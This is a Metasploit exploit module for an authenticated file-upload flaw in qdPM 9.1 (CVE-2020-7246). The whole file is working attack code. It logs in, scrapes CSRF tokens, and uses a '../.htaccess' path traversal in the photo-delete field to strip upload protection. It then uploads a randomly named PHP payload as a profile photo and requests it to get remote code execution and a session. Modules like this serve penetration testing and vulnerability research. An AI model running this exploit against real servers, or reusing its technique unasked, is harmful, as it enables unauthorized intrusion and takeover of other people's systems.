##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::PhpEXE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'qdPM 9.1 Authenticated Arbitrary PHP File Upload (RCE)',
        'Description' => %q{
          A remote code execution (RCE) vulnerability exists in qdPM 9.1 and earlier.
          An attacker can upload a malicious PHP code file via the profile photo functionality, by leveraging a path traversal
          vulnerability in the users['photop_preview'] delete photo feature, allowing bypass of .htaccess protection.
          NOTE: this issue exists because of an incomplete fix for CVE-2015-3884.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Rishal Dwivedi (Loginsoft)', # Discovery
          'Leon Trappett (thepcn3rd)', # PoC
          'Giacomo Casoni' # Metasploit
        ],
        'References' => [
          ['CVE', '2020-7246'],
          ['EDB', '50175']
        ],
        'Payload' => {
          'BadChars' => "\x00"
        },
        'DefaultOptions' => {
          'EXITFUNC' => 'thread'
        },
        'Platform' => %w[linux php],
        'Targets' => [
          [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' } ]
        ],
        'Privileged' => true,
        'DisclosureDate' => '2020-11-21',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => ['CRASH_SAFE'],
          'Reliability' => ['IOC_IN_LOGS'],
          'SideEffects' => ['REPEATABLE_SESSION']
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base directory where qdPM resides', '/']),
        OptString.new('EMAIL', [true, 'The email to login with']),
        OptString.new('PASSWORD', [true, 'The password to login with'])
      ]
    )

    self.needs_cleanup = true
  end

  def check
    uri = normalize_uri(target_uri.path)
    base = File.dirname("#{uri}.")
    res = send_request_raw({ 'uri' => normalize_uri(base, '/index.php') })
    login_page = res.get_html_document
    begin
      version_num = login_page.at('div[@class="copyright"]').at('a').text.tr('qdPM ', '').to_f
    rescue StandardError
      return Exploit::CheckCode::Unknown
    end
    version = Rex::Version.new(version_num)
    if version <= Rex::Version.new('9.1')
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def on_new_session(cli)
    print_warning("Removing: #{@clean_file}")
    begin
      if cli.type == 'meterpreter'
        cli.fs.file.rm(@clean_file)
      else
        cli.shell_command_token("rm #{@clean_file}")
      end
    rescue ::StandardError => e
      print_error("Unable to remove #{@clean_file}: #{e.message}")
    end
  end

  # Login function
  def login(base, username, password)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri("#{base}/index.php/login"),
      'keep_cookies' => true
    })
    login_page = res.get_html_document
    csrf_token = login_page.at("input[name='login[_csrf_token]']/@value")
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri("#{base}/index.php/login"),
      'vars_post' => {
        'login[email]' => username,
        'login[password]' => password,
        'login[_csrf_token]' => csrf_token
      },
      'keep_cookies' => true,
      'headers' => {
        'Origin' => "http://#{rhost}",
        'Referer' => "http://#{rhost}/#{base}/index.php/login"
      }
    })
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => "#{base}index.php/myAccount",
      'headers' => {
        'Host' => rhost.to_s
      }
    })
    account_page = res.get_html_document
    begin
      userid = account_page.at("input[@name='users[id]']/@value").text.strip
    rescue StandardError
      print_error('The designated admin account does not have a user ID.')
      return {}
    end
    username = account_page.at("input[@name='users[name]']/@value").text.strip
    csrftoken_ = account_page.at("input[@name='users[_csrf_token]']/@value").text.strip
    opts = {
      'user_id' => userid,
      'name' => username,
      'csrf_token' => csrftoken_
    }
    return opts
  end

  def upload_php(base, opts)
    fname = opts['filename']
    php_payload = opts['data']
    user_id = opts['user_id']
    username = opts['username']
    email = opts['email']
    csrf_token = opts['csrf_token']

    data = Rex::MIME::Message.new
    data.add_part('put', nil, nil, 'form-data; name="sf_method"')
    data.add_part(user_id, nil, nil, 'form-data; name="users[id]"')
    data.add_part('.htaccess', nil, nil, 'form-data; name="users[photo_preview]"')
    data.add_part(csrf_token, nil, nil, 'form-data; name="users[_csrf_token]"')
    data.add_part(username, nil, nil, 'form-data; name="users[name]"')
    data.add_part('', nil, nil, 'form-data; name="users[new_password]"')
    data.add_part(email, nil, nil, 'form-data; name="users[email]"')
    data.add_part('', nil, nil, 'form-data; name="extra_fields[9]"')
    data.add_part('1', nil, nil, 'form-data; name="users[remove_photo]"')

    post_data = data.to_s

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri("#{base}/index.php/myAccount/update"),
      'ctype' => "multipart/form-data; boundary=#{data.bound}",
      'data' => post_data,
      'keep_cookies' => true,
      'headers' => {
        'Origin' => "http://#{rhost}",
        'Referer' => "http://#{rhost}#{base}/index.php/home/myAccount"
      }
    })

    data = Rex::MIME::Message.new
    data.add_part('put', nil, nil, 'form-data; name="sf_method"')
    data.add_part(user_id, nil, nil, 'form-data; name="users[id]"')
    data.add_part('../.htaccess', nil, nil, 'form-data; name="users[photo_preview]"')
    data.add_part(csrf_token, nil, nil, 'form-data; name="users[_csrf_token]"')
    data.add_part(username, nil, nil, 'form-data; name="users[name]"')
    data.add_part('', nil, nil, 'form-data; name="users[new_password]"')
    data.add_part(email, nil, nil, 'form-data; name="users[email]"')
    data.add_part('', nil, nil, 'form-data; name="extra_fields[9]"')
    data.add_part('1', nil, nil, 'form-data; name="users[remove_photo]"')

    post_data = data.to_s

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri("#{base}/index.php/myAccount/update"),
      'ctype' => "multipart/form-data; boundary=#{data.bound}",
      'data' => post_data,
      'keep_cookies' => true,
      'headers' => {
        'Origin' => "http://#{rhost}",
        'Referer' => "http://#{rhost}#{base}/index.php/home/myAccount"
      }
    })

    data = Rex::MIME::Message.new
    data.add_part('put', nil, nil, 'form-data; name="sf_method"')
    data.add_part(user_id, nil, nil, 'form-data; name="users[id]"')
    data.add_part('', nil, nil, 'form-data; name="users[photo_preview]"')
    data.add_part(csrf_token, nil, nil, 'form-data; name="users[_csrf_token]"')
    data.add_part(username, nil, nil, 'form-data; name="users[name]"')
    data.add_part('', nil, nil, 'form-data; name="users[new_password]"')
    data.add_part(email, nil, nil, 'form-data; name="users[email]"')
    data.add_part('', nil, nil, 'form-data; name="extra_fields[9]"')
    data.add_part(php_payload, 'application/octet-stream', nil, "form-data; name=\"users[photo]\"; filename=\"#{fname}\"")

    post_data = data.to_s

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri("#{base}index.php/myAccount/update"),
      'ctype' => "multipart/form-data; boundary=#{data.bound}",
      'data' => post_data,
      'keep_cookies' => true,
      'headers' => {
        'Origin' => "http://#{rhost}",
        'Referer' => "http://#{rhost}#{base}/index.php/home/myAccount"
      }
    })

    return res.code == 302
  end

  def exec_php(base, _opts)
    res = send_request_cgi({
      'uri' => normalize_uri("#{base}/index.php/myAccount"),
      'keep_cookies' => true
    })
    home_page = res.get_html_document
    backdoor = home_page.at("//input[@name='users[photo_preview]']/@value")
    @clean_file = backdoor
    send_request_cgi({
      'uri' => normalize_uri("#{base}/uploads/users/#{backdoor}")
    })
  end

  def exploit
    uri = normalize_uri(target_uri.path)
    base = File.dirname("#{uri}.")

    user = datastore['EMAIL']
    pass = datastore['PASSWORD']
    print_status("Attempt to login with '#{user}:#{pass}'")
    opts = login(base, user, pass)
    if opts.empty?
      print_error('Login unsuccessful or bad (admin) user')
      return
    end

    php_fname = "#{Rex::Text.rand_text_alpha(5)}.php"
    p = get_write_exec_payload

    print_status("Uploading PHP payload (#{p.length} bytes)...")
    data = {
      'username' => user.scan(/^(.+)@.+/).flatten[0] || '',
      'email' => user.to_s,
      'filename' => php_fname,
      'data' => p
    }
    data = data.merge(opts)
    uploader = upload_php(base, data)
    if !uploader
      print_error('Unable to upload')
      return
    end

    print_status("Executing '#{php_fname}'")
    exec_php(base, opts)
  end
end
